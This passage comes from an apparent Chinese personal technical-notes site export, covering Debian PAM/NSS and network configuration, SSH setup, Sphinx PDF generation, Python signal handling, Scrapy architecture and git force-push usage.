             3161    GNU C 库：帮助页面\nglibc-doc-reference   I:4                             12740   GNU C 库：参考手册，有 info、pdf 和 html 格式（non-free）\nlibnss-mdns                   I:508                   150             用于解析组播 DNS 名称的 NSS 模块\nlibnss-ldap                   I:11                    265             NSS 模块，用于使用 LDAP 作为一个名称服务的\nlibnss-ldapd          I:14                    153             NSS 模块，用于使用 LDAP 作为一个名称服务的（libnss-ldap 的新 fork） libpam-doc 中 \"The Linux-PAM System Administrators' Guide\" 是了解 PAM 配置的必要文档。 glibc-doc-reference 中的 \"System Databases and Name Service Switch\" 是了解 NSS 配置的重要文档。 注意 你可以使用 \" aptitude search 'libpam-|libnss-' \" 命令查看更多的相关软件包。\nNSS 缩写也可能意味着 \"Network Security Service，网络安全服务\"，它不同于 \"Name Service Switch，名称服务切换\"。 PAM 是用来为每个程序使用系统范围的默认值来初始化环境变量的最基础方法。 在 systemd 下, libpam-systemd 软件包被安装用来管理用户登录，\n通过为 logind 在 systemd 控制组层级中注册用户会话来实现。 PAM 和 NSS 访问的配置文件 下面是一些 PAM 和 NSS 访问的重要配置文件: 配置文件                                          功能\n/etc/pam.d/program_name               为 \"program_name\" 程序设置 PAM 配置；参加 pam(7) 和 pam.d(5)\n/etc/nsswitch.conf                    为每个服务条目设置 NSS 配置。参见 nsswitch.conf(5)\n/etc/nologin                          通过 pam_nologin(8) 模块限制用户登陆\n/etc/securetty                                通过 pam_securetty(8) 模块限制 root 访问 tty\n/etc/security/access.conf     通过 pam_access(8) 模块设置访问限制\n/etc/security/group.conf      通过 pam_group(8) 模块设置基于组的限制\n/etc/security/pam_env.conf    通过 pam_env(8) 模块设置环境变量\n/etc/environment                      通过带有 \"readenv=1\" 参数的 pam_env(8) 模块设置额外的环境变量\n/etc/default/locale                   通过带有 \"readenv=1 envfile=/etc/default/locale\" 参数的 pam_env(8) 模块设置语言环境值（在 Debian 系统中）\n/etc/security/limits.conf     通过 pam_linits(8) 模块设置资源限制（ulimit、core 等等）\n/etc/security/time.conf               通过 pam_time(8) 模块设置时间限制\n/etc/systemd/logind.conf      设置systemd 的登录管理器配置 (参见 logind.conf(5) 和 systemd-logind.service(8)) 密码选择的限制是通过 PAM 模块 pam_unix (8) 和 pam_cracklib (8) 来实现的。它们可以通过各自的参数进行配置。 注解 PAM 模块在文件名中使用后缀 \" .so \"。 现代的集中式系统管理 现代的集中式系统管理可以使用集中式的 轻量目录访问协议（LDAP） 服务器进行部署，从而通过网络管理许多类 Unix 和 非类 Unix 系统。\n轻量目录访问协议的开源实现是 OpenLDAP 软件 LDAP 服务器使用带有 PAM 和 NSS 的 libpam-ldap 和 libnss-ldap 软件包为 Debian 系统提供账号信息。\n需要一些动作来启用 LDAP（我没有使用过这个设置，并且下面的信息纯粹是第二手的信息。请在这种前提下阅读下列内容。 通过运行一个程序，例如独立的 LDAP 守护进程 slapd (8)，来建立集中式的 LDAP 服务器。 你在 \" /etc/pam.d/ \" 目录中的 PAM 配置文件里，使用 \" pam_ldap.so \" 替代默认值 \" pam_unix.so \"。\n- Debian 使用 \" /etc/pam_ldap.conf \" 作为 libpam-ldap 的配置文件，\" /etc/pam_ldap.secret \" 作为保存 root 密码的文件。 你在 \" /etc/nsswitch.conf \" 文件中改变 NSS 配置，使用 \" ldap \" 替代默认值（\" compat \" 或 \" file \"）。\n- Debian 使用 \" /etc/libnss-ldap.conf \" 作为 libnss-ldap 的配置文件。 为了密码的安全，你必须让 libpam-ldap 使用 SLL（或 TLS） 连接。 为了确保 LDAP 网络开销数据的完整性，你必须让 libpam-ldap 使用 SLL（或 TLS） 连接。 为了减少 LDAP 网络流量，你应该在本地运行 nscd (8) 来缓存任何 LDAP 搜索结果。 为什么 GNU su 不支持 wheel 组 这是在旧的 \" info su \" 底部 Richard M. Stallman 所说的一句名言。\n别担心：Debian 系统中当前的 su 命令使用了 PAM，\n这样当在 \" /etc/pam.d/su \" 中启用了带有 \" pam_wheel.so \" 的行后，\n就能够限制非 wheel 组的用户 su 到 root 组的能力。 确保互联网上的的密码安全 许多流行的传输层服务都使用纯文本来传输包括密码验证信息在内的各类消息。\n使用纯文本在公网上传输密码是很糟糕的做法，因为这样传输的密码很容易在网上被他人截获。\n为了确保整个沟通过程，包括密码信息在内都使用加密传输来确保安全，\n您可以在 传输层安全（Transport Layer Security，TLS） 协议或者其前身，\"安全套接字层（Secure Sockets Layer，SSL）\"协议之上运行这些服务: 不安全的服务名               端口              安全的服务名                  端口\nwww (http)            80                      https                   443\nsmtp (邮件)             25                      ssmtp (smtps)   465\nftp-data              20                      ftps-data               989\nftp                           21                      ftps                    990\ntelnet                        23                      telnets                 992\nimap2                 143                     imaps                   993\npop3                  110                     pop3s                   995\nldap                  389                     ldaps                   636 加密消耗 CPU 时间。\n作为对 CPU 有益的替代方案，你可以保持使用纯文本通讯，\n仅仅使用安全认证协议加密密码，\n比如说：POP 使用\"Authenticated Post Office Protocol\" (APOP)，\nSMTP 和 IMAP 使用 \"Challenge-Response Authentication Mechanism MD5\" (CRAM-MD5)。\n（你的邮件客户端通过互联网上你的邮件服务器发送邮件时，\n最近流行使用新的递交端口 587 来代替传统的 SMTP 端口 25，\n这样可以避免在使用 CRAM-MD5 认证自己时，网络提供商阻塞 25 端口。） 安全 Shell 安全 Shell (SSH) 程序使用安全认证来提供不安全网络上两个不可信任主机之间的安全加密通讯。\n它由 OpenSSH 客户端, ssh (1), 和 OpenSSH 后台守护进程（daemon）, sshd (8)组成.SSH 使用端口转发特性，\n可以给 POP 和 X 之类的不安全的协议通讯建立隧道，使其可以在互联网上安全传输。 客户端可以使用如下方式来认证自己： 基于主机的认证 公钥认证 质疑应答认证 密码认证 使用公钥认证，可以实现远程免密码登录。\n参见 第 6.3 节 \"服务器远程访问和工具 (SSH)\" root 密码安全 为阻止人们使用 root 权限访问你的机器，你需要做下面的操作。 阻止对硬盘的物理访问 锁住 UEFI/ BIOS 来阻止从可移动介质启动 为 GRUB 交互式会话设置密码 锁住 GRUB 菜单，禁止编辑 sudo 参考: sudo PolicyKit PolicyKit 是在类 Unix 操作系统中控制整个系统权限的一个操作系统组件。 较新的 GUI 图形界面程序设计时便考虑到了不作为特权进程来运行。\n它们通过 PolicyKit 来和特权进程通信，从而执行管理操作。 在 Debian 系统中，PolicyKit 限制了属于 sudo 组的用户账号的这种操作。 网络设置 主机名解析 主机名解析，目前也是由 NSS (名字服务转换 Name Service Switch) 机制来支持。这个解析的流程如下 /etc/nsswitch.conf 文件里的 hosts: files dns 这段规定主机名解析顺序。\n(代替 /etc/host.conf 文件里的\" order 这段原有的功能。) files 方式首先被调用。如果主机名在 /etc/hosts 文件里面发现，\n则返回所有有效地址并退出。 ( /etc/host.conf 文件包含 multi on .) dns 方式被调用。如果主机名通过查询 /etc/resolv.conf 文件里面写的 互联网域名系统 Domain Name System (DNS) 来找到，则返回所有有效地址并退出 /etc/hosts 参考 etc-hosts /etc/resolv.conf 参考 etc-resolv-conf 对于典型 adhoc 局域网环境下的 PC 工作站，除了基本的 files 和 dns 方式之外，\n主机名还能够通过组播 DNS mDNS, [零配置网络 Zeroconf 进行解析 Avahi <https://zh.wikipedia.org/wiki/Avahi_(software)>_ 提供 Debian 下的组播 DNS 发现框架。 它和 Apple Bonjour / Apple Rendezvous 相当. libnss-mdns 插件包提供 mDNS 的主机名解析，GNU C 库 (glibc)的 GNU 名字服务转换 Name Service Switch (NSS) 功能支持 mDNS。 \" /etc/nsswitch.conf \" 文件应当有像 \" hosts: files mdns4_minimal [NOTFOUND=return] dns mdns4 \" 这样的一段. \".local\" 结尾的主机名，\n使用 pseudo-top-level domain (TLD) 来解析. mDNS IPv4 本地连接组播地址 \" 224.0.0.251 \" 或它相应的 IPv6 地址 \" FF02::FB \" 被用来作为 \" .local \" 结尾名字的 DNS 查询。 较老的 Windows 系统安装 winbind 软件包来提供旧的 NETBios over TCP/IP 主机名解析。\n为启用这个功能，\" /etc/nsswitch.conf \" 文件应当有这样的一段：\n\" hosts: files mdns4_minimal [NOTFOUND=return] dns mdns4 wins \"。 (现代 Windows 系统通常使用 dns 方式来进行主机名解析。) 局域网网络地址范围 让我们重新提醒下在 rfc1918 里规定的 局域网 local area networks (LANs) IPv4 32 位地址在各类地址的保留范围. 这些地址保证不会与因特网上专有的地址冲突。 注解 IP 地址书写中有冒号的是 IPv6 地址 ，\n例如，\" ::1 \" 是 localhost 本地主机 网络地址范围列表: 类别    网络地址                                    子网掩码            子网掩码/位数 子网数\nA     10.x.x.x                                        255.0.0.0               /8                      1\nB     172.16.x.x — 172.31.x.x         255.255.0.0             /16                     16\nC     192.168.0.x — 192.168.255.x     255.255.255.0   /24                     256 注解 如果这些地址分配到一个主机，那么这个主机一定不能够直接访问互联网，\n必须通过一个作为网关的代理服务或通过 网络地址转换 Network Address Translation (NAT) .\n消费局域网环境，宽带路由器通常使用 NAT。 图形界面的网络配置工具 Debian 系统 NM 的官方文档位于 \" /usr/share/doc/network-manager/README.Debian \" 。 本质上，如下操作即可完成桌面的网络配置。 通过下列命令使桌面用户 foo 归属 \" netdev \" 组\n（另外，例如 GNOME 和 KDE 这样的现代桌面环境会通过 [D-bus < https://zh.wikipedia.org/wiki/D-Bus ) 自动完成该操作）: $ sudo adduser foo netdev 使 \" /etc/network/interfaces \" 的\n配置保持下面那样简洁: auto lo\niface lo inet loopback 通过下列\n命令重新启动 NM: $ sudo systemctl restart network-manager 通过图形界面配置网络\n注意,\n只有 不 列在 \" /etc/network/interfaces \" 中的接口会被 NM 管理，以避免与 ifupdown 的冲突。 提示 如果你想扩展 NM 的网络配置功能，请寻找适当的插件模块和补充软件包，\n例如 network-manager-openconnect 、 network-manager-openvpn-gnome 、 network-manager-pptp-gnome 、 mobile-broadband-provider-info 、 gnome-bluetooth 等等。 底层网络配置 在 Linux 上的底层网络配置，使用 iproute2 程序 ( ip (8), …) . Iproute2 命令 Iproute2 命令集提供完整的底层网络配置能力。\n有个从旧的 net-tools 命令集到新的 iproute2 命令集的转换表 从旧的 net-tools 命令集到新的 iproute2 命令集转换表: 旧的 net-tools  新的 iproute2                     操作\nifconfig(8)                   ip addr                 一个设备上的协议（IP 或 IPv6）地址\nroute(8)                      ip route                路由表条目\narp(8)                                ip neigh                ARP 或 NDISC 缓存条目\nipmaddr                               ip maddr                多播地址\niptunnel                      ip tunnel               IP 隧道\nnameif(8)                     ifrename(8)             基于 MAC 地址的网络接口名\nmii-tool(8)                   ethtool(8)              以太网设备设置 安全的底层网络操作 你可以按下面的方式安全的使用底层网络命令，这些命令不会改变网络配置: 命令                                            说明\nip addr show                  显示活动的网络接口连接和地址状态\nroute -n                              用数字地址显示全部路由表\nip route show                 用数字地址显示全部路由表\narp                                           显示当前 ARP 缓存表的内容\nip neigh                              显示当前 ARP 缓存表的内容\nplog                                  显示 ppp 后台守护进程（daemon）日志\nping yahoo.com                        检查到 \"yahoo.com\" 的因特网连接\nwhois yahoo.com                       在域名数据库里面检查谁注册了 \"yahoo.com\"\ntraceroute yahoo.com  跟踪到 \"yahoo.com\" 的因特网连接\ntracepath yahoo.com           跟踪到 \"yahoo.com\" 的因特网连接\nmtr yahoo.com                 跟踪到 \"yahoo.com\" 的因特网连接（重复的）\ndig                                   查询由 \"dns-server.com\" 提供服务的 \"example.com\" 域名的 DNS 记录： \"a\", \"mx\" 或 \"any\" 记录\ndig[@dns-server.com] example.com [{a|mx|any}]\niptables -L -n                        查看包过滤\nnetstat -a                            找出所有打开的端口\nnetstat -l --inet             找出监听端口\nnetstat -ln --tcp             找出 TCP 监听端口（数字的）\ndlint example.com             查询 \"example.com\" 的 DNS zone 信息 找出最佳 MTU 最大传输单元 Maximum Transmission Unit (MTU) 的值能够通过加 \" -M do \" 选项的 ping (8) 实验来确定，\n它发送从 1500 字节（对于IP+ICMP 包头，有 28 字节的偏移）大小开始的 ICMP 包，来找出 IP 不分片的最大包大小。 尝试下列例子: $ ping -c 1 -s $((1500-28)) -M do www.debian.org\nPING www.debian.org (194.109.137.218) 1472(1500) bytes of data.\nFrom 192.168.11.2 icmp_seq=1 Frag needed and DF set (mtu = 1454)\n\n--- www.debian.org ping statistics ---\n0 packets transmitted, 0 received, +1 errors 尝试 MTU=1454 代替 MTU=1500 你看到用 MTU=1454 ping (8) 成功了。 如果 MTU 不是 1500，你可能想在 NM 里面配置 MTU 设置。 这个过程是 路径 MTU (PMTU) 发现 , [RFC1191 , tracepath (8) 命令能够自动完成这个。 注解 上面的列子，PMTU 的值是 1454，这是我先前的光纤到户提供商，\n使用了 异步传输模式 Asynchronous Transfer Mode (ATM)\n作为他们的骨干网络，并使用 PPPoE 作为客户端。实际 PMTU 值依赖于你的环境，比如说，我新的光纤到户提供商是 1500。 网络应用 浏览器配置 在某些浏览器中，你可以使用下列特殊的 URL 来确认它们的设置。 \" about: \" \" about:config \" \" about:plugins \" SSH 国际化和本地化 系统技巧-任务安排 单次任务 定时任务 谁在系统 警告所有人 硬盘分区配置 二进制数据访问","tags":"操作系统","url":"/yq-docs-operating-system-linux-system-service-Certification-and-access-control.html","loc":"/yq-docs-operating-system-linux-system-service-Certification-and-access-control.html"},{"title":"crontab服务","text":"见 crond","tags":"操作系统","url":"/yq-docs-operating-system-linux-system-service-Crontab-service.html","loc":"/yq-docs-operating-system-linux-system-service-Crontab-service.html"},{"title":"SSH配置","text":"服务器远程访问和工具 (SSH, Secure Shell) Secure SHell (SSH)\n是因特网上的 安全 连接方式。\n在 Debian 里面，有一个叫 OpenSSH 的免费 SSH 版本，在 openssh-client 和 openssh-server 包里。 对于用户来讲, ssh 功能比 telnet 更加智能和安全.\n不像 telnet 命令, ssh 命令不会在遇到 telnet 的退出字符(初始默认是 CTRL-])时停止. SSH 基础 OpenSSH SSH 后台守护进程（daemon）只支持 SSH 2协议。 警告 如果想要运行 OpenSSH 服务， /etc/ssh/sshd_not_to_be_run 必须不存在。 不要打开基于 rhost 的认证( /etc/ssh/sshd_config 中的 HostbasedAuthentication )。 处理其它 SSH 客户端 其它平台上有一些免费的 SSH 客户端。 其它平台上免费 SSH 客户端列表: 环境                  免费 SSH 程序\nWindows               puTTY (http://www.chiark.greenend.org.uk/~sgtatham/putty/) (GPL)\nWindows (cygwin)      cygwin 里的 SSH (http://www.cygwin.com/) (GPL)\nMacintosh 类          macSSH (http://www.macssh.com/) (GPL)\nMac OS X              OpenSSH;在终端应用中使用 ssh (GPL) 建立 ssh 代理 用密码来保护你的 SSH 认证私钥是安全的。\n如果密码没有设置，使用 ssh-keygen -p 来设置。\n把你的公钥 (比如： ~/.ssh/id_rsa.pub ) 放到远程主机的 ~/.ssh/authorized_keys ，这个远程主机使用上面描述的基于密码的连接方式: $ ssh-agent bash\n$ ssh-add ~/.ssh/id_rsa Enter passphrase for /home/*username*/.ssh/id_rsa: Identity added: /home/*username*/.ssh/id_rsa (/home/*username*/.ssh/id_rsa) 从这里执行接下来的命令，就不再需要密码: $ scp foo username@remote.host:foo 按 &#94;D 来终结 ssh 代理会话。 对于 X 服务端， 通常的 Debian 启动脚本会作为父进程执行 ssh-agent 。\n所以你只需要执行一次 ssh-add 。进一步的信息，请阅读 ssh-agent 和 ssh-add . 怎样通过 SSH 关闭远程系统 你可以使用 at 命令\n(参见 第 9.4.13 节 \"单次任务时间安排\" )\n来从 SSH 终端里保护 shutdown -h now (参见 第 1.1.8 节 \"怎样关闭系统\" 操作过程: ### echo \"shutdown -h now\" | at now SSH 故障排查 如果你遇到问题，检查配置文件的权限并用 -v 选项运行 ssh 如果你是 root 账户，并有使用防火墙，使用 -p 选项;\n这可以避免使用1 — 1023 之间的服务端口. 如果 ssh 连接到远程站点突然停止工作，这也许是系统管理员胡乱操作的结果，\n可能是在系统维护时改变了 host_key .\n在确认这个情况后，并且没有人试图用聪明的黑客技术来篡改远程主机，\n你可以在本机 ~/.ssh/known_hosts 里删除 host_key 条目来重新获得连接 设置会话过期 设置会话过期: # /etc/ssh/sshd_config\n\nServerAliveInterval 60        # 单次发送包检查链接时间，单位是秒，为0表示不发\nServerAliveCountMax 30        # 最大检查次数，超过后断开链接 ClientAliveInterval 这个其实就是SSH Server与Client的心跳超时时间，\n也就是说，当客户端没有指令过来，\nServer间隔`ClientAliveInterval`的时间（单位秒）会发一个空包到Client来维持心跳，\n60表示每分钟发送一次，然后客户端响应，这样就保持长连接了保证Session有效, 默认是0, 不发送; ClientAliveCountMax 当心跳包发送失败时重试的次数，比如现在我们设置成了30，\n如果Server向Client连续发30次心跳包都失败了，就会断开这个session连接。 另一个地方: # /etc/profile\nTMOUT=60    # 空闲等待时间，默认值0，表示不超时 ssh的时候定义别名 方法 1 – 使用 SSH 配置文件 这是我创建别名的首选方法。 我们可以使用 SSH 默认配置文件来创建 SSH 别名。为此，\n编辑 ~/.ssh/config 文件（如果此文件不存在，只需创建一个）: $ vi ~/.ssh/config 添加所有远程主机的详细信息，如下所示: Host webserver\n    HostName 192.168.225.22\n    User sk\n\nHost dns\n    HostName server.example.com\n    User root\n\nHost dhcp\n    HostName 192.168.225.25\n    User ostechnix\n    Port 2233 方法 2 – 使用 Bash 别名 这是创建 SSH 别名的一种应急变通的方法，可以加快通信的速度。\n你可以使用 alias 使这项任务更容易。 打开 ~/.bashrc 或者 ~/.bash_profile 文件: alias webserver='ssh sk@server.example.com'\nalias dns='ssh sk@server.example.com'\nalias dhcp='ssh sk@server.example.com -p 2233'\nalias ubuntu='ssh sk@server.example.com -i ~/.ssh/id_rsa_remotesystem' 再次确保你已使用自己的值替换主机、主机名、端口号和 IP 地址。保存文件并退出。 然后，使用命令应用更改: $ source ~/.bashrc 或者: $ source ~/.bash_profile 在此方法中，你甚至不需要使用 ssh 别名 命令。相反，只需使用别名，如下所示。 $ webserver\n$ dns\n$ dhcp\n$ ubuntu （方法2太慢了 alias debian9=\"user@host\" 然后 ssh debian9 太慢了 ）","tags":"操作系统","url":"/yq-docs-operating-system-linux-system-service-SSH.html","loc":"/yq-docs-operating-system-linux-system-service-SSH.html"},{"title":"IO模型","text":"BIO 阻塞IO NIO 非阻塞IO Java有提供一个Selector的多路复用机制 Selector多路复用 不会阻塞 在Linux下, 是基于epoll实现 会维护一个epoll数组, 底层调用C的本地方法返回一个文件描述符: epoll_create(256) 其他相关可参考 IO模型 Netty线程模型 基于NIO做了一系列封装,\n性能高于 redis","tags":"后端","url":"/yq-docs-rear-end-java-IO-model.html","loc":"/yq-docs-rear-end-java-IO-model.html"},{"title":"Sphinx简单使用","text":"创建Sphinx项目 以在当前文件夹下为例 yanque@yanquedembp new_doc_rst % sphinx-quickstart ./\n欢迎使用 Sphinx 5 .0.0 快速配置工具。\n\n请输入接下来各项设置的值（如果方括号中指定了默认值, 直接\n按回车即可使用默认值）。\n\n已选择根路径：./\n\n有两种方式来设置 Sphinx 输出的创建目录：\n一是在根路径下创建\"_build\"目录, 二是在根路径下创建\"source\"\n和\"build\"两个独立的目录。\n> 独立的源文件和构建目录（y/n） [ n ] :\n\n项目名称将会出现在文档的许多地方。\n> 项目名称: study_doc\n> 作者名称: yanque\n> 项目发行版本 [] : 0 .0.0\n\n如果用英语以外的语言编写文档,\n你可以在此按语言代码选择语种。\nSphinx 会把内置文本翻译成相应语言的版本。\n\n支持的语言代码列表见：\nhttp://sphinx-doc.org/config.html#confval-language。\n> 项目语种 [ en ] : zh_CN\n\n创建文件 /Users/yanque/project/new_doc_rst/source/conf.py。\n创建文件 /Users/yanque/project/new_doc_rst/source/index.rst。\n创建文件 /Users/yanque/project/new_doc_rst/Makefile。\n创建文件 /Users/yanque/project/new_doc_rst/make.bat。\n\n完成：已创建初始目录结构。\n\n你现在可以填写主文档文件 /Users/yanque/project/new_doc_rst/source/index.rst 并创建其他文档源文件了。 用 Makefile 构建文档, 例如：\nmake builder\n此处的\"builder\"是支持的构建器名, 比如 html、latex 或 linkcheck。 注解 注意不要使用独立的source文件夹, 不然使用toctree会存在相对路径的问题, 暂没找到解决方案.\n粗略看了一下源码, make不知道怎么打断点, 看起来感觉是设计存在问题, 作罢. 配置 配置文件在 config.py , 默认的主题比较丑 使用 html_theme = 'sphinx_rtd_theme' 安装 pip install sphinx_rtd_theme 报错 Could not import extension hoverxref.extension , 安装: pip install sphinx-hoverxref Could not import extension notfound.extension : pip install sphinx-notfound-page sphinx生成pdf文档 相关资源: latex部分说明参考: LaTeX 定制 使用外部字体参考: Configuring fontspec to use the fonts 如果没有中文的需求, 直接用 rst2pdf 即可,\n但是如果有中文的话, 就无法识别中文字符, 即使使用了中文字体. 研究了一段时间, 最稳妥的做法就是使用 xelatex 先生成 LaTeX , 再生成 pdf Mac需要先安装必要的软件 brew install mactex --cask # ubuntu 需要安装 xelatex apt install xelatex\napt install texlive\napt install texlive-full conf.py配置 # master_doc = \"index\" latex_engine = 'xelatex' # latex_elements = { #     'papersize': 'a4paper', #     # 调整章节标题之间的间距 #     'preamble': r''' #         \\makeatletter #         \\let\\clearpage\\relax #         \\makeatother #     ''', # } latex_elements = { 'papersize' : 'a4paper' , 'utf8extra' : '' , 'inputenc' : '' , 'cmappkg' : '' , 'fontenc' : '' , 'fontpkg' : r '\\usepackage {fontspec} ' , 'preamble' : r ''' \\usepackage {xeCJK} \\usepackage {fontspec} \\parindent 1em \\setcounter {tocdepth}{2} \\setlength{\\parskip}{0.5\\baselineskip} \\renewcommand\\familydefault{\\ttdefault} \\renewcommand\\CJKfamilydefault{\\CJKrmdefault} \\let\\cleardoublepage\\clearpage  % 确保不会有空页 ''' , } # 设置文档 # latex_documents = [ #     (master_doc, 'sphinx.tex', '你的第一本 Sphinx 书', #      '作者：', 'manual', True), # ] 最后, 生成pdf(会先生成 LaTeX , 再去 LaTeX 的输出目录下make生成 pdf ) make latexpdf 可能遇到的问题 pdf存在空页 每隔一页, 就会存在一页空页, 解决: \\let\\cleardoublepage\\clearpage  % 确保不会有空页 注解 或者设置sphinx的conf配置 默认情况下, 生成的 PDF 是双页打印模式的, 在电脑上浏览会发现有很多空白, 这是那些左侧有文字, 右侧没有内容, 且下面的内容在下一个章节的情况下, 会留空. 要设置这一点, 在 latex_elements 中添加一项 latex_elements = { 'extraclassoptions' : 'openany,oneside' , } 此处参考: 使用 Sphinx 生成 LaTeX 文件 (最终得到 PDF) 再拓展记录一下 'extraclassoptions': 'openany,oneside' 是一个全局配置选项, 它会影响整个文档的页面布局。它会让 LaTeX 允许在任何位置开始新页面,并使用单页面布局。 \\let\\cleardoublepage\\clearpage 禁用 LaTeX 默认的章节/节开始时强制使用新奇数页的行为, 仅输出当前页面.\n是一个局部的命令,它只会影响当前部分的页面行为。它将 cleardoublepage 命令重定义为 clearpage 。 cleardoublepage 命令是 LaTeX 的一个内部命令,它会确保在新的章节或节开始时, 总是在一个新的页面上。\n而 clearpage 命令只是简单地强制输出当前页面,而不管是否为奇数页。 Undefined control sequence 没有找到包, 通常意味着你尝试使用的某个 LaTeX 命令或宏没有被定义 解决, 找到需要用的包 比如我的报错信息是: ! Undefined control sequence.\nl.32 \\setmainfont\n{FreeSerif}[\n? 对应缺少的宏包是 fontspec , 在 latex_elements 中添加: \\usepackage{fontspec} 由于这个是个字体配置, 还需要添加字体包配置: 'fontpkg': r'\\usepackage{fontspec}', 标题过长时未折行 配置: % 中文断行\n\\XeTeXlinebreaklocale \"zh\"\n\\XeTeXlinebreakskip = 0pt plus 1pt sphinx关于latex配置说明 主要是 latex_element 相关项 extraclassoptions 额外配置选项 (全局配置) 比如: extraclassoptions': 'openany,oneside , 表示 openany: 该选项用于控制 LaTeX 文档的页码布局。 默认情况下, LaTeX 会强制在章节开始的时候使用奇数页码。\n使用 openany 选项后, LaTeX 会允许在任何位置开始新的页面,而不仅仅是奇数页。\n这对于一些不需要双页面布局的文档很有用,比如电子书或者单页打印的文档。 oneside: 该选项用于控制 LaTeX 文档的页面布局。 默认情况下, LaTeX 会使用双页面布局,即左右两页构成一个完整的页面。\n使用 oneside 选项后, LaTeX 会使用单页面布局,即每一页是独立的。\n这对于一些不需要双页面布局的文档很有用,比如电子书或者单页打印的文档。 详细模版配置见: latex模版配置说明","tags":"后端; python","url":"/yq-docs-rear-end-python-conclusion-of-issue-Sphinx-use.html","loc":"/yq-docs-rear-end-python-conclusion-of-issue-Sphinx-use.html"},{"title":"signal","text":"官网文档:: signal 部分参考:: python进程间通信--信号Signal python的信号处理模块 信号是 Unix 系统中常见的一种进程间通信方式（IPC）, 也叫软中断信号 作用是通知进程发生了异步事件。进程之间可以调用系统来传递信号, 本身内核也可以发送信号给进程, 告诉该进程发生了某个事件. 注解 注意，信号只是用来通知某进程发生了什么事件，并不给该进程传递任何数据。 Python 信号处理程序总是会在主 Python 主解释器的主线程中执行，即使信号是在另一个线程中接收的。 这意味着信号不能被用作线程间通信的手段。 你可以改用 threading 模块中的同步原语。 此外，只有主解释器的主线程才被允许设置新的信号处理程序。 接收信号的进程对不同的信号有三种处理方法: 指定处理函数 忽略 根据系统默认值处理, 大部分信号的默认处理是终止进程 linux相关信号可见: linux系统信号 signal函数 signal.signal(signalnum, handler) 信号中最关键的一个方法, 用于声明一个信号。\n当进程运行过程中出现故障异常或者需要进程间通信时, 由操作系统内核中的进程或者应用中的进程发出处理信号, 通知注册了信号的进程进行处理。 sig: int 要处理的信号名称 handler: 信号处理方法, 可选值: SIG_DFL    表示默认方法处理 SIG_IGN    表示忽略这个信号(一般为了避免父进程和子进程的互相干扰而使用) handler 自定义回调函数handler 自定义handler 用于在进程捕捉到其他进程发送的信号时调用的函数. 当此函数返回时, 进程继续按原来的逻辑顺序执行。 此函数在定义时python普通函数的定义没有区别。\n函数名不一定是handler, 但作为作为参数传入signal()方法的参数名一定是与定义handler函数的函数相同: def  handler(signum,frame):\n\n    do  something…\n\nsig:\n  接收到的信号编号, signal模块内部定义了一些常用的内核信号, 并为它们进行了编号。\n\n  注意: windows操作系统没有SIGUSR1和SIGUSR2这两个型号类型, linux操作系统才有\nframe:\n  信号结构对象(可以通过结构对象查看信号信息,基本不用)\n\n  signal函数实际上是一个异步的回调函数, 只要执行了该函数, 则进程任意时候接收到相应信号都会处理。\n\n  这里的异步就是上文提到的异步机制, 是计算机内核程序与本进程间同时运行, 互相不干扰的一种机制, 对于进程的正常执行有着关键的作用。\n  这种异步机制在任何后端编程语言中都是存在的, 只不过实现的方式和细节不一样而已。 alarm signal.alarm(sec) 非阻塞函数 设置时钟信号,在一定时间后给自身发送一个 SIGALRM 信号 原理: 时钟的创建是进程交由操作系统内核(kernal)帮助创建的 时钟和进程之间是异步执行的, 当时钟到时,内核会发送信号给进程, 进程接收信号进行相应的响应操作。 注意: 如果设置多个时钟, 后面的时钟会覆盖前面的时钟,一个进程只有一个挂起的时钟。 pause signal.pause() 阻塞进程,等待一个信号.当接收到信号时就会停止阻塞 例如: 等待signal()函数的发送 getsignal signal.getsignal(signalnum) 获取某个 signalnum 对应的 handler 信号举例 windows操作系统下, SIGNALINT编号为2: >>>signal.SIGINT\n<Signals.SIGINT: 2> SIGBREAK编号为21: >>>signal.SIGBREAK\n<Signals.SIGBREAK: 21> 常用信号类型解析: SIGHUP   断开连接\nSIGINT    ctrl-C\nSIGUIT    ctrl-\\\nSIGTSTP   ctrl-z\nSIGKILL    终止进程且不能被处理\nSIGSTOP   暂停进程且不能被处理\nSIGALRM   时钟进程\nSIGCHLD   子进程状态改变发送给父进程信息号(但一般父进程不会处理) linux系统信号可参考: linux系统信号 技巧 在系统中, SIGKILL 和 SIGSTOP 两种信号, 进程是无法捕获的. 所以对于需要人为杀死的进程, 可使用SIGTERM信号，SIGTERM表示终止信号，是kill命令传送的系统默认信号，\n它与SIGKIIL的区别是，SIGTERM更为友好，进程可以捕捉SIGTERM信号，进而根据需要来做一些清理工作. 手动触发就是: kill -15 pid 警告 多线程环境下使用信号，只有 main thread 可以设置 signal 的 handler","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-signal.html","loc":"/yq-docs-rear-end-python-python-standard-library-signal.html"},{"title":"架构","text":"架构图(绿色线代表数据流) 架构 Scrapy Engine(引擎) 负责Spider、ItemPipeline、Downloader、Scheduler中间的通讯，信号、数据传递等。 Scheduler(调度器) 它负责接受引擎发送过来的Request请求，并按照一定的方式进行整理排列，入队，当引擎需要时，交还给引擎。 Downloader（下载器） 负责下载Scrapy Engine(引擎)发送的所有Requests请求，并将其获取到的Responses交还给Scrapy Engine(引擎)，由引擎交给Spider来处理， Spider（爬虫） 它负责处理所有Responses,从中分析提取数据，获取Item字段需要的数据，并将需要跟进的URL提交给引擎，再次进入Scheduler(调度器). Item Pipeline(管道) 它负责处理Spider中获取到的Item，并进行进行后期处理（详细分析、过滤、存储等）的地方。 Downloader Middlewares（下载中间件） 你可以当作是一个可以自定义扩展下载功能的组件。 Spider Middlewares（Spider中间件） 你可以理解为是一个可以自定扩展和操作引擎和Spider中间通信的功能组件（比如进入Spider的Responses;和从Spider出去的Requests）","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Architecture.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Scrapy-Architecture.html"},{"title":"sphinx","text":"rst文档库 使用见 index 安装: pip install sphinx","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-sphinx.html","loc":"/yq-docs-rear-end-python-python-three--party-library-sphinx.html"},{"title":"一些问题/用法","text":"强制提交 强制提交, 如将本地test分支强制（-f）推送到远程主分支master 方法一: git push origin test:master -f 方法二: # 将当前分支切换到主分支 git checkout master # 将主分支重置为test分支 git reset --hard test # 将重置后的master分支强制推送到远程仓库 git push origin master -f 强制更新本地 拉取分支时强制覆盖本地 方法一: git pull -f origin $remote_branch:$local_branch 方法二: # 拉到本地库 git fetch --all # 本地库强制重制 git reset --hard $branch # 工作区更新 git pull # 合起来一行代码 # git fetch --all 